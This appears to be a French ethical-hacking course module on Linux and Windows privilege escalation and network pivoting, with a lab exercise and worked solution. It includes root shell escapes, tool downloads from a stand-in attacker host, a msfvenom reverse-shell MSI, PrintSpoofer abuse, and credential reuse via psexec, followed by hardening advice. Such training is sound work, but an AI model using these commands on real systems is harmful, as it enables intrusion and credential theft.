---
tags:
  - hacking
  - privesc
  - linux
  - windows
  - formation
---

# Module 5 : Post-Exploitation & PrivEsc

Vous avez un shell ? Bravo. Mais vous êtes probablement `www-data` ou `user`. L'objectif maintenant : devenir `root` ou `SYSTEM`.

## 1. Linux Privilege Escalation

### Méthodologie
1.  **Kernel** : Le noyau est-il vieux ? (DirtyCow, PwnKit).
2.  **Sudo** : `sudo -l`. Avez-vous le droit de lancer une commande sans mot de passe ?
3.  **SUID** : Fichiers exécutables avec les droits du propriétaire (root).
    *   `find / -perm -4000 2>/dev/null`
4.  **Cron** : Tâches planifiées modifiables ?

### GTFOBins
La bible. Si vous avez le droit de lancer `vim` en sudo, vous êtes root.
*   `sudo vim -c ':!/bin/sh'`

### Scripts d'Enumération Automatique
Ne cherchez pas à la main.
*   **LinPEAS** : `linpeas.sh`. Le script ultime qui scanne tout et met en rouge les failles probables.

## 2. Windows Privilege Escalation

### Méthodologie
1.  **Services non cotés** (Unquoted Service Paths).
2.  **DLL Hijacking**.
3.  **AlwaysInstallElevated** (MSI installés en SYSTEM).
4.  **Mots de passe stockés** (Registre, fichiers unattend.xml).

### Scripts
*   **WinPEAS** : L'équivalent Windows.
*   **PowerUp.ps1** : Script PowerShell pour trouver les mauvaises configurations.

## 3. Pivoting (Mouvement Latéral)

Vous êtes sur le serveur Web (DMZ), mais la base de données est sur un réseau interne inaccessible depuis Internet.
Il faut utiliser le serveur Web comme un **relais**.

### SSH Port Forwarding (Rappel)
```bash
# Tunnel dynamique (SOCKS)
ssh -D 9090 user@compromised-server
```
Puis configurez `proxychains` sur Kali pour passer par ce port 9090.

### Chisel / Ligolo
Des outils plus robustes pour créer des tunnels VPN à travers des firewalls restrictifs.

---

## Exercice Pratique

!!! example "Exercice : Élévation de Privilèges Linux et Windows"

    **Objectif** : Obtenir un shell utilisateur standard puis élever ses privilèges vers root/SYSTEM.

    **Prérequis** :
    - Machine Linux vulnérable (ex: HackTheBox, VulnHub)
    - Machine Windows vulnérable (ex: Metasploitable3 Windows)
    - Scripts d'énumération : LinPEAS, WinPEAS

    **Partie 1 : Linux Privilege Escalation**

    Vous avez obtenu un shell en tant que `www-data` sur un serveur web Ubuntu.

    1. **Énumération Manuelle** :
       ```bash
       # Informations système
       uname -a
       cat /etc/os-release

       # Vérifier sudo
       sudo -l

       # Chercher les SUID
       find / -perm -4000 -type f 2>/dev/null

       # Cron jobs
       cat /etc/crontab
       ls -la /etc/cron.d/

       # Capabilities
       getcap -r / 2>/dev/null
       ```

    2. **Énumération Automatique** :
       ```bash
       # Télécharger LinPEAS
       wget http://attacker.com/linpeas.sh
       chmod +x linpeas.sh
       ./linpeas.sh
       ```

    3. **Exploitation** : Selon les résultats, exploitez une des failles trouvées :
       - SUID binaire exploitable (ex: `/usr/bin/find`)
       - Sudo mal configuré (ex: `sudo vim`)
       - Kernel exploit (ex: DirtyCow)
       - Cron job modifiable

    **Partie 2 : Windows Privilege Escalation**

    Vous avez un shell en tant que `iis apppool\defaultapppool` sur un serveur IIS.

    1. **Énumération Système** :
       ```powershell
       # Informations système
       systeminfo

       # Privilèges actuels
       whoami /priv
       whoami /groups

       # Services vulnérables
       sc query

       # Chercher des mots de passe
       reg query HKLM /f password /t REG_SZ /s
       reg query HKCU /f password /t REG_SZ /s

       # AlwaysInstallElevated
       reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
       reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
       ```

    2. **WinPEAS** :
       ```powershell
       # Télécharger et exécuter
       certutil -urlcache -f http://attacker.com/winPEASx64.exe winpeas.exe
       .\winpeas.exe
       ```

    3. **Exploitation** : Selon les résultats :
       - Service avec unquoted path
       - SeImpersonatePrivilege (JuicyPotato/PrintSpoofer)
       - DLL Hijacking
       - Token manipulation

    **Partie 3 : Pivoting**

    Depuis le serveur compromis, accédez au réseau interne.

    ```bash
    # Setup tunnel SSH dynamique
    ssh -D 9050 user@compromised-host

    # Configurer proxychains
    echo "socks4 127.0.0.1 9050" >> /etc/proxychains4.conf

    # Scanner le réseau interne via le pivot
    proxychains nmap -sT -Pn 10.10.10.0/24
    ```

    **Questions** :
    - Sur Linux, quelle vulnérabilité avez-vous exploitée pour root ?
    - Sur Windows, quel privilège était exploitable ?
    - Combien de machines avez-vous découvert sur le réseau interne ?

??? quote "Solution"

    **Partie 1 : Linux Privilege Escalation**

    **Énumération Manuelle** :
    ```bash
    www-data@webserver:/tmp$ sudo -l
    Matching Defaults entries for www-data on webserver:
        env_reset, mail_badpass

    User www-data may run the following commands on webserver:
        (root) NOPASSWD: /usr/bin/find
    ```

    **Exploitation via GTFOBins** :
    ```bash
    # Recherche sur https://gtfobins.github.io/gtfobins/find/
    # Exploitation :
    www-data@webserver:/tmp$ sudo find . -exec /bin/bash \; -quit

    root@webserver:/tmp# whoami
    root

    root@webserver:/tmp# id
    uid=0(root) gid=0(root) groups=0(root)

    root@webserver:/tmp# cat /root/root.txt
    3f8d7a9c2b1e4f5a6c8b9d0e1f2a3b4c
    ```

    **Alternative avec LinPEAS** :
    ```bash
    www-data@webserver:/tmp$ ./linpeas.sh

    # Output (extrait) :
    [+] Checking 'sudo -l'...
    [1;31m[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
        User www-data may run the following commands:
            (root) NOPASSWD: /usr/bin/find  <=== EXPLOITABLE!

    [+] SUID binaries
        /usr/bin/passwd
        /usr/bin/gpasswd
        /usr/bin/find  <=== Potentially vulnerable

    [+] Capabilities
        /usr/bin/python3.8 = cap_setuid+ep  <=== CRITICAL!
    ```

    **Exploitation via Python Capabilities** :
    ```bash
    www-data@webserver:/tmp$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

    root@webserver:/tmp# whoami
    root
    ```

    **Partie 2 : Windows Privilege Escalation**

    **Énumération** :
    ```powershell
    C:\inetpub\wwwroot> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                Description                               State
    ============================= ========================================= ========
    SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
    SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled  <== EXPLOITABLE!
    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
    ```

    **Exploitation avec PrintSpoofer** :
    ```powershell
    # Télécharger PrintSpoofer
    C:\inetpub\wwwroot> certutil -urlcache -f http://attacker.com/PrintSpoofer64.exe ps.exe

    # Exploitation
    C:\inetpub\wwwroot> .\ps.exe -i -c cmd
    [+] Found privilege: SeImpersonatePrivilege
    [+] Named pipe listening...
    [+] CreateProcessAsUser() OK

    Microsoft Windows [Version 10.0.17763.1879]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32> whoami
    nt authority\system

    C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
    9a7f8c6b5d4e3f2a1c8b9d0e1f2a3b4c
    ```

    **Alternative : AlwaysInstallElevated**
    ```powershell
    # Vérification
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    AlwaysInstallElevated    REG_DWORD    0x1

    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    AlwaysInstallElevated    REG_DWORD    0x1

    # Génération d'un MSI malveillant (sur Kali)
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f msi > evil.msi

    # Sur la cible Windows
    C:\> msiexec /quiet /qn /i C:\Temp\evil.msi

    # Sur Kali (listener)
    nc -lvnp 4444
    # Shell reçu en tant que SYSTEM
    ```

    **WinPEAS Output (extrait)** :
    ```bash
    [+] Looking for AutoLogon credentials
        DefaultDomainName    : CORP
        DefaultUserName      : administrator
        DefaultPassword      : P@ssw0rd123!  <=== CREDENTIAL FOUND!

    [+] Checking AlwaysInstallElevated
        [X] Both keys are set to 1!  <=== VULNERABLE!

    [+] Unquoted Service Paths
        C:\Program Files\Vulnerable Service\service.exe  <=== Exploitable
    ```

    **Partie 3 : Pivoting**

    **Setup du tunnel** :
    ```bash
    # Sur Kali
    ssh -D 9050 www-data@webserver.corp.local -i compromised_key

    # Vérification
    ss -tunlp | grep 9050
    # tcp   LISTEN 0  128  127.0.0.1:9050  0.0.0.0:*
    ```

    **Scan du réseau interne** :
    ```bash
    # Configuration proxychains
    cat /etc/proxychains4.conf
    [ProxyList]
    socks4  127.0.0.1 9050

    # Scan via le pivot
    proxychains nmap -sT -Pn 10.10.10.0/24

    # Résultats :
    Nmap scan report for 10.10.10.5
    PORT     STATE SERVICE
    22/tcp   open  ssh
    445/tcp  open  microsoft-ds

    Nmap scan report for 10.10.10.10
    PORT     STATE SERVICE
    80/tcp   open  http
    3306/tcp open  mysql

    Nmap scan report for 10.10.10.15
    PORT     STATE SERVICE
    3389/tcp open  ms-wbt-server
    ```

    **Exploitation d'une machine interne** :
    ```bash
    # Réutilisation des credentials trouvées
    proxychains psexec.py administrator:P@ssw0rd123!@10.10.10.15

    [*] Requesting shares on 10.10.10.15.....
    [*] Found writable share ADMIN$
    [!] Launching semi-interactive shell - CTRL+C to exit

    C:\Windows\system32> whoami
    corp\administrator

    C:\Windows\system32> ipconfig
    Ethernet adapter Ethernet0:
       IPv4 Address. . . . . . . . . . . : 10.10.10.15
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 10.10.10.1
    ```

    **Réponses aux Questions** :

    1. **Vulnérabilité Linux exploitée** :
       - `sudo` mal configuré permettant `/usr/bin/find` en tant que root sans mot de passe
       - Alternative : Python capabilities `cap_setuid+ep`

    2. **Privilège Windows exploitable** :
       - `SeImpersonatePrivilege` exploité via PrintSpoofer
       - Alternative : `AlwaysInstallElevated` avec MSI malveillant

    3. **Machines découvertes sur le réseau interne** :
       - 3 machines actives (10.10.10.5, 10.10.10.10, 10.10.10.15)
       - Services critiques : SSH, SMB, HTTP, MySQL, RDP

    **Techniques Clés Démontrées** :

    1. **Linux** :
       - Énumération avec LinPEAS
       - Exploitation GTFOBins (sudo/SUID)
       - Abuse de capabilities

    2. **Windows** :
       - Token impersonation (SeImpersonatePrivilege)
       - AlwaysInstallElevated
       - Credential hunting dans le registre

    3. **Pivoting** :
       - SSH dynamic port forwarding
       - Proxychains pour scanner/exploiter le réseau interne
       - Lateral movement avec credentials réutilisées

    **Recommandations** :

    1. **Linux** :
       - Auditer les configurations `sudo` (principe du moindre privilège)
       - Restreindre les capabilities (`setcap -r`)
       - Mettre à jour le kernel régulièrement
       - Monitorer les modifications de fichiers SUID

    2. **Windows** :
       - Désactiver `AlwaysInstallElevated`
       - Restreindre `SeImpersonatePrivilege` aux comptes nécessaires uniquement
       - Ne jamais stocker de mots de passe en clair dans le registre
       - Implémenter LAPS pour les comptes locaux
       - Utiliser des Managed Service Accounts

    3. **Réseau** :
       - Segmentation réseau stricte (VLANs, firewalls internes)
       - Monitoring des connexions SSH sortantes inhabituelles
       - Détection des scans de ports internes
       - Principe du Zero Trust

---

## Navigation

| | |
|:---|---:|
| [← Module 4 : Active Directory Hacking](04-module.md) | [Module 6 : Projet Final : Audit Black... →](06-tp-final.md) |

[Retour au Programme](index.md){ .md-button }
